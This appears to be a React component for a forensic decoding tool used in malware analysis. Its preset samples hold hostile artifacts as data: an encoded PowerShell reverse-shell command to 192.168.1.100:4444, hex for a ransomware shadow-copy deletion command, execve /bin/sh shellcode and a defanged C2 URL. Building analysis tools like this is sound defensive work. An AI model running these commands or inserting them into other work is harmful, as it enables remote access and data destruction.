import React, { useState } from 'react';
import { 
  Binary, 
  Code2, 
  ShieldAlert, 
  Copy, 
  Check, 
  Sparkles, 
  RotateCcw, 
  Terminal, 
  Cpu, 
  Eye, 
  Layers, 
  Link, 
  Unlink, 
  Key, 
  Flame,
  ArrowRightLeft,
  AlertTriangle
} from 'lucide-react';
import { 
  decodeBase64Safe, 
  encodeBase64, 
  decodeHex, 
  encodeHex, 
  decodeBinary, 
  encodeBinary, 
  rot13, 
  defangThreatIndicators, 
  refangThreatIndicators, 
  xorDecode, 
  bruteForceXor, 
  unpackPowerShellPayload, 
  calculateShannonEntropy 
} from '../utils/forensicDecoders';

export const ForensicDecoders: React.FC = () => {
  const [activeTab, setActiveTab] = useState<'deobfuscator' | 'base64' | 'hex' | 'binary' | 'rot13' | 'xor' | 'defanger'>('deobfuscator');
  
  // General State
  const [inputPayload, setInputPayload] = useState<string>(
    'powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAiACwANAA0ADQANAApAA=='
  );
  const [outputPayload, setOutputPayload] = useState<string>('');
  const [copied, setCopied] = useState<boolean>(false);
  
  // XOR state
  const [xorKey, setXorKey] = useState<number>(0x5a);
  const [xorCandidates, setXorCandidates] = useState<{ key: number; hexKey: string; preview: string; printableRatio: number }[]>([]);

  // ROT13 shift
  const [rotShift, setRotShift] = useState<number>(13);

  // Hex format
  const [hexFormat, setHexFormat] = useState<'space' | '0x' | 'slashX' | 'raw'>('space');

  // Deobfuscator results
  const [psAnalysis, setPsAnalysis] = useState<{ detected: boolean; extractedCommands: string[]; notes: string[] } | null>(null);

  // Copy helper
  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  // Run instant deobfuscation
  const runAutoDeobfuscate = () => {
    const analysis = unpackPowerShellPayload(inputPayload);
    setPsAnalysis(analysis);
    if (analysis.extractedCommands.length > 0) {
      setOutputPayload(analysis.extractedCommands.join('\n\n--- UNPACKED LAYER ---\n\n'));
    } else {
      // Fallback to base64 check or general decode
      const b64 = decodeBase64Safe(inputPayload);
      if (b64.encoding !== 'invalid') {
        setOutputPayload(`[Decoded Base64 (${b64.encoding.toUpperCase()})]:\n` + b64.output);
      } else {
        setOutputPayload('[No standard nested encoding or PowerShell command detected. Try manual Base64, Hex, or XOR tabs.]');
      }
    }
  };

  // Calculate entropy
  const entropy = calculateShannonEntropy(inputPayload);
  const isHighEntropy = entropy > 5.0;

  return (
    <div className="space-y-6 max-w-7xl mx-auto">
      {/* Header Banner */}
      <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 relative overflow-hidden">
        <div className="absolute right-0 top-0 w-96 h-96 bg-cyan-500/5 rounded-full blur-3xl pointer-events-none" />
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 relative z-10">
          <div>
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-cyan-500/10 border border-cyan-500/20 text-cyan-400 text-xs font-mono mb-3">
              <Sparkles className="w-3.5 h-3.5" />
              <span>FORENSIC REVERSE ENGINEERING SUITE</span>
            </div>
            <h1 className="text-2xl sm:text-3xl font-bold text-white font-mono tracking-tight">
              De-obfuscator & Forensic Decoders
            </h1>
            <p className="text-slate-400 text-sm mt-1 max-w-2xl">
              Inspect obfuscated malware scripts, decode multi-layer Base64/Hex/XOR payloads, calculate Shannon entropy, and sanitize live IOCs for incident reports.
            </p>
          </div>

          {/* Shannon Entropy Metric Card */}
          <div className="bg-slate-800/80 border border-slate-700/80 rounded-xl p-4 min-w-[220px]">
            <div className="flex items-center justify-between text-xs text-slate-400 mb-1">
              <span className="font-mono flex items-center gap-1.5">
                <Flame className={`w-3.5 h-3.5 ${isHighEntropy ? 'text-amber-400' : 'text-emerald-400'}`} />
                Shannon Entropy
              </span>
              <span className={`font-mono font-bold ${isHighEntropy ? 'text-amber-400' : 'text-emerald-400'}`}>
                {entropy} / 8.0
              </span>
            </div>
            <div className="w-full bg-slate-700 h-2 rounded-full overflow-hidden mb-2">
              <div 
                className={`h-full transition-all duration-300 ${isHighEntropy ? 'bg-gradient-to-r from-amber-500 to-rose-500' : 'bg-emerald-500'}`}
                style={{ width: `${Math.min(100, (entropy / 8) * 100)}%` }}
              />
            </div>
            <p className="text-[11px] text-slate-400 font-sans">
              {isHighEntropy 
                ? '⚠️ High entropy detected: Likely encrypted, packed, or compressed payload.' 
                : '✓ Normal entropy: Likely plain text, human readable source code, or uncompressed script.'}
            </p>
          </div>
        </div>

        {/* Tab Navigation */}
        <div className="flex flex-wrap gap-2 mt-6 pt-6 border-t border-slate-800">
          {[
            { id: 'deobfuscator', label: 'Automated Unpacker', icon: Sparkles },
            { id: 'base64', label: 'Base64 (UTF-8 & UTF-16LE)', icon: Code2 },
            { id: 'hex', label: 'Hexadecimal Stream', icon: Binary },
            { id: 'binary', label: 'Binary 8-Bit', icon: Terminal },
            { id: 'rot13', label: 'ROT13 / Caesar', icon: RotateCcw },
            { id: 'xor', label: 'Single-Byte XOR Brute', icon: Key },
            { id: 'defanger', label: 'URL & IP Defanger', icon: Link },
          ].map((tab) => {
            const Icon = tab.icon;
            const isActive = activeTab === tab.id;
            return (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id as any)}
                className={`flex items-center gap-2 px-3.5 py-2 rounded-xl text-xs font-mono transition-all ${
                  isActive 
                    ? 'bg-cyan-500 text-slate-950 font-bold shadow-lg shadow-cyan-500/20' 
                    : 'bg-slate-800/60 hover:bg-slate-800 text-slate-300 border border-slate-700/50'
                }`}
              >
                <Icon className="w-3.5 h-3.5" />
                <span>{tab.label}</span>
              </button>
            );
          })}
        </div>
      </div>

      {/* Preset Quick Loader Buttons */}
      <div className="flex flex-wrap items-center gap-2 text-xs font-mono bg-slate-900/90 border border-slate-800 p-3.5 rounded-xl">
        <span className="text-slate-300 font-bold flex items-center gap-1.5 pr-2 border-r border-slate-800">
          <Flame className="w-3.5 h-3.5 text-rose-500" /> High-Risk Artifacts:
        </span>
        <button
          onClick={() => {
            setInputPayload('powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAiACwANAA0ADQANAApAA==');
            setActiveTab('deobfuscator');
          }}
          className="px-2.5 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-cyan-300 border border-slate-700 transition flex items-center gap-1.5"
        >
          <span className="w-1.5 h-1.5 rounded-full bg-rose-500"></span>
          <span>PowerShell Reverse Shell (-Enc)</span>
        </button>
        <button
          onClick={() => {
            setInputPayload('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGU=');
            setActiveTab('base64');
          }}
          className="px-2.5 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-indigo-300 border border-slate-700 transition flex items-center gap-1.5"
        >
          <span className="w-1.5 h-1.5 rounded-full bg-rose-500"></span>
          <span>PE Executable Header (Base64)</span>
        </button>
        <button
          onClick={() => {
            setInputPayload('76 73 73 61 64 6d 69 6e 20 64 65 6c 65 74 65 20 73 68 61 64 6f 77 73 20 2f 61 6c 6c 20 2f 71 75 69 65 74');
            setActiveTab('hex');
          }}
          className="px-2.5 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-amber-300 border border-slate-700 transition flex items-center gap-1.5"
        >
          <span className="w-1.5 h-1.5 rounded-full bg-rose-500"></span>
          <span>Ransomware vssadmin (Hex)</span>
        </button>
        <button
          onClick={() => {
            setInputPayload('90 90 90 90 31 c0 50 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 50 53 89 e1 99 b0 0b cd 80');
            setActiveTab('hex');
          }}
          className="px-2.5 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-red-300 border border-slate-700 transition flex items-center gap-1.5"
        >
          <span className="w-1.5 h-1.5 rounded-full bg-rose-500"></span>
          <span>Shellcode NOP Sled (Hex)</span>
        </button>
        <button
          onClick={() => {
            setInputPayload('hxxps://malicious-c2-gateway[.]top:4444/payload[.]exe?user=admin[@]bank[.]com');
            setActiveTab('defanger');
          }}
          className="px-2.5 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-purple-300 border border-slate-700 transition flex items-center gap-1.5"
        >
          <span className="w-1.5 h-1.5 rounded-full bg-amber-500"></span>
          <span>Live C2 Threat URL (Defanger)</span>
        </button>
        <button
          onClick={() => {
            setInputPayload('4b 4f 43 4b 42 49 54 20 4c 4f 43 4b 45 44');
            setActiveTab('xor');
          }}
          className="px-2.5 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-emerald-300 border border-slate-700 transition flex items-center gap-1.5"
        >
          <span className="w-1.5 h-1.5 rounded-full bg-emerald-500"></span>
          <span>XOR Encrypted C2 Key</span>
        </button>
      </div>

      {/* Main Dual-Pane Workspace */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        
        {/* Left Pane: Input */}
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-5 flex flex-col justify-between space-y-4">
          <div>
            <div className="flex items-center justify-between mb-3">
              <label className="text-xs font-mono font-bold text-slate-300 uppercase tracking-wider flex items-center gap-2">
                <Terminal className="w-4 h-4 text-cyan-400" />
                Artifact / Encoded Input
              </label>
              <button
                onClick={() => setInputPayload('')}
                className="text-xs text-slate-400 hover:text-slate-200 transition font-mono"
              >
                Clear
              </button>
            </div>
            <textarea
              value={inputPayload}
              onChange={(e) => setInputPayload(e.target.value)}
              placeholder="Paste Base64, Hexadecimal bytes, obfuscated PowerShell, or IOCs here..."
              rows={12}
              className="w-full bg-slate-950 border border-slate-800 rounded-xl p-3.5 text-xs font-mono text-cyan-300 focus:outline-none focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 transition resize-none leading-relaxed"
            />
          </div>

          {/* Specific Tab Controls */}
          <div className="pt-2 border-t border-slate-800/80 space-y-3">
            {activeTab === 'deobfuscator' && (
              <button
                onClick={runAutoDeobfuscate}
                className="w-full py-2.5 px-4 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-mono font-bold text-xs flex items-center justify-center gap-2 transition shadow-lg shadow-cyan-500/20"
              >
                <Sparkles className="w-4 h-4" />
                EXECUTE AUTO-DEOBFUSCATION RECURSION
              </button>
            )}

            {activeTab === 'base64' && (
              <div className="grid grid-cols-2 gap-3">
                <button
                  onClick={() => {
                    const res = decodeBase64Safe(inputPayload);
                    setOutputPayload(res.output);
                  }}
                  className="py-2 px-3 rounded-xl bg-cyan-500/10 hover:bg-cyan-500/20 border border-cyan-500/30 text-cyan-400 font-mono text-xs font-semibold flex items-center justify-center gap-1.5 transition"
                >
                  <Eye className="w-3.5 h-3.5" /> Decode Base64
                </button>
                <button
                  onClick={() => setOutputPayload(encodeBase64(inputPayload))}
                  className="py-2 px-3 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 font-mono text-xs font-semibold flex items-center justify-center gap-1.5 transition"
                >
                  <Code2 className="w-3.5 h-3.5" /> Encode to Base64
                </button>
              </div>
            )}

            {activeTab === 'hex' && (
              <div className="space-y-2">
                <div className="flex items-center gap-2 text-xs font-mono text-slate-400">
                  <span>Format:</span>
                  {(['space', '0x', 'slashX', 'raw'] as const).map((fmt) => (
                    <button
                      key={fmt}
                      onClick={() => setHexFormat(fmt)}
                      className={`px-2 py-0.5 rounded text-[11px] ${
                        hexFormat === fmt ? 'bg-cyan-500 text-slate-950 font-bold' : 'bg-slate-800 text-slate-400'
                      }`}
                    >
                      {fmt}
                    </button>
                  ))}
                </div>
                <div className="grid grid-cols-2 gap-3">
                  <button
                    onClick={() => setOutputPayload(decodeHex(inputPayload))}
                    className="py-2 px-3 rounded-xl bg-cyan-500/10 hover:bg-cyan-500/20 border border-cyan-500/30 text-cyan-400 font-mono text-xs font-semibold flex items-center justify-center gap-1.5 transition"
                  >
                    Decode Hex ➔ Text
                  </button>
                  <button
                    onClick={() => setOutputPayload(encodeHex(inputPayload, hexFormat))}
                    className="py-2 px-3 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 font-mono text-xs font-semibold flex items-center justify-center gap-1.5 transition"
                  >
                    Encode Text ➔ Hex
                  </button>
                </div>
              </div>
            )}

            {activeTab === 'binary' && (
              <div className="grid grid-cols-2 gap-3">
                <button
                  onClick={() => setOutputPayload(decodeBinary(inputPayload))}
                  className="py-2 px-3 rounded-xl bg-cyan-500/10 hover:bg-cyan-500/20 border border-cyan-500/30 text-cyan-400 font-mono text-xs font-semibold flex items-center justify-center gap-1.5 transition"
                >
                  Binary ➔ Text
                </button>
                <button
                  onClick={() => setOutputPayload(encodeBinary(inputPayload))}
                  className="py-2 px-3 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 font-mono text-xs font-semibold flex items-center justify-center gap-1.5 transition"
                >
                  Text ➔ Binary
                </button>
              </div>
            )}

            {activeTab === 'rot13' && (
              <div className="space-y-3">
                <div className="flex items-center justify-between text-xs font-mono text-slate-400">
                  <span>Alphabet Shift Offset: {rotShift}</span>
                  <input
                    type="range"
                    min="1"
                    max="25"
                    value={rotShift}
                    onChange={(e) => setRotShift(parseInt(e.target.value))}
                    className="w-32 accent-cyan-400"
                  />
                </div>
                <button
                  onClick={() => setOutputPayload(rot13(inputPayload, rotShift))}
                  className="w-full py-2 px-3 rounded-xl bg-cyan-500/10 hover:bg-cyan-500/20 border border-cyan-500/30 text-cyan-400 font-mono text-xs font-semibold flex items-center justify-center gap-1.5 transition"
                >
                  Apply Caesar Shift (ROT-{rotShift})
                </button>
              </div>
            )}

            {activeTab === 'xor' && (
              <div className="space-y-3">
                <div className="flex items-center gap-3">
                  <div className="flex-1">
                    <label className="text-[11px] font-mono text-slate-400 block mb-1">XOR Key (0-255 / Hex):</label>
                    <input
                      type="text"
                      value={'0x' + xorKey.toString(16).toUpperCase()}
                      onChange={(e) => {
                        const val = parseInt(e.target.value.replace('0x', ''), 16);
                        if (!isNaN(val) && val >= 0 && val <= 255) setXorKey(val);
                      }}
                      className="w-full bg-slate-950 border border-slate-800 rounded-lg px-2.5 py-1.5 text-xs font-mono text-cyan-300"
                    />
                  </div>
                  <button
                    onClick={() => setOutputPayload(xorDecode(inputPayload, xorKey))}
                    className="mt-4 px-4 py-2 bg-cyan-500 text-slate-950 font-bold font-mono text-xs rounded-xl"
                  >
                    Apply Key
                  </button>
                </div>
                <button
                  onClick={() => {
                    const results = bruteForceXor(inputPayload);
                    setXorCandidates(results);
                  }}
                  className="w-full py-2 px-3 rounded-xl bg-purple-500/10 hover:bg-purple-500/20 border border-purple-500/30 text-purple-300 font-mono text-xs font-semibold flex items-center justify-center gap-1.5 transition"
                >
                  <Key className="w-3.5 h-3.5" /> Brute Force All 255 Keys (High Printable ASCII)
                </button>
              </div>
            )}

            {activeTab === 'defanger' && (
              <div className="grid grid-cols-2 gap-3">
                <button
                  onClick={() => setOutputPayload(defangThreatIndicators(inputPayload))}
                  className="py-2.5 px-3 rounded-xl bg-amber-500/10 hover:bg-amber-500/20 border border-amber-500/30 text-amber-400 font-mono text-xs font-semibold flex items-center justify-center gap-1.5 transition"
                >
                  <Unlink className="w-3.5 h-3.5" /> Defang URL / IPs (hxxp, [.])
                </button>
                <button
                  onClick={() => setOutputPayload(refangThreatIndicators(inputPayload))}
                  className="py-2.5 px-3 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 font-mono text-xs font-semibold flex items-center justify-center gap-1.5 transition"
                >
                  <Link className="w-3.5 h-3.5" /> Refang Live Indicators
                </button>
              </div>
            )}
          </div>
        </div>

        {/* Right Pane: Output */}
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-5 flex flex-col justify-between space-y-4">
          <div>
            <div className="flex items-center justify-between mb-3">
              <label className="text-xs font-mono font-bold text-slate-300 uppercase tracking-wider flex items-center gap-2">
                <Code2 className="w-4 h-4 text-emerald-400" />
                Decoded / Forensic Output
              </label>
              <div className="flex items-center gap-2">
                <button
                  onClick={() => handleCopy(outputPayload)}
                  disabled={!outputPayload}
                  className="inline-flex items-center gap-1 px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-mono transition disabled:opacity-40"
                >
                  {copied ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                  <span>{copied ? 'Copied!' : 'Copy'}</span>
                </button>
              </div>
            </div>
            <textarea
              value={outputPayload}
              readOnly
              placeholder="Decoded output will appear here..."
              rows={12}
              className="w-full bg-slate-950 border border-slate-800 rounded-xl p-3.5 text-xs font-mono text-emerald-300 focus:outline-none transition resize-none leading-relaxed selection:bg-emerald-900 selection:text-white"
            />
          </div>

          {/* PowerShell Unpacker Diagnostic Badges */}
          {psAnalysis && psAnalysis.notes.length > 0 && (
            <div className="bg-slate-950 border border-slate-800/90 rounded-xl p-3.5 space-y-2">
              <span className="text-[11px] font-mono font-bold text-cyan-400 flex items-center gap-1.5">
                <Layers className="w-3.5 h-3.5" />
                Deobfuscation Chain Diagnostics:
              </span>
              <div className="space-y-1">
                {psAnalysis.notes.map((n, i) => (
                  <div key={i} className="text-xs font-mono text-slate-300 flex items-center gap-2">
                    <span className="text-emerald-400">✓</span> {n}
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* XOR Brute Force Candidates List */}
          {activeTab === 'xor' && xorCandidates.length > 0 && (
            <div className="bg-slate-950 border border-slate-800 rounded-xl p-3 max-h-44 overflow-y-auto space-y-2">
              <span className="text-[11px] font-mono font-bold text-purple-400 flex items-center justify-between">
                <span>Top Printable Candidates ({xorCandidates.length})</span>
                <span className="text-slate-500 text-[10px]">Click key to apply</span>
              </span>
              <div className="space-y-1">
                {xorCandidates.slice(0, 5).map((cand, idx) => (
                  <button
                    key={idx}
                    onClick={() => {
                      setXorKey(cand.key);
                      setOutputPayload(cand.preview);
                    }}
                    className="w-full text-left p-2 rounded bg-slate-900 hover:bg-slate-800 border border-slate-800 text-xs font-mono flex items-center justify-between group transition"
                  >
                    <div className="truncate max-w-[280px]">
                      <span className="text-purple-400 font-bold mr-2">{cand.hexKey}:</span>
                      <span className="text-slate-300">{cand.preview}</span>
                    </div>
                    <span className="text-[10px] text-emerald-400 font-bold">{cand.printableRatio}%</span>
                  </button>
                ))}
              </div>
            </div>
          )}

          <div className="text-[11px] text-slate-500 font-mono flex items-center justify-between pt-2 border-t border-slate-800">
            <span>Character Count: {outputPayload.length}</span>
            <span>Entropy: {calculateShannonEntropy(outputPayload)}</span>
          </div>
        </div>
      </div>
    </div>
  );
};
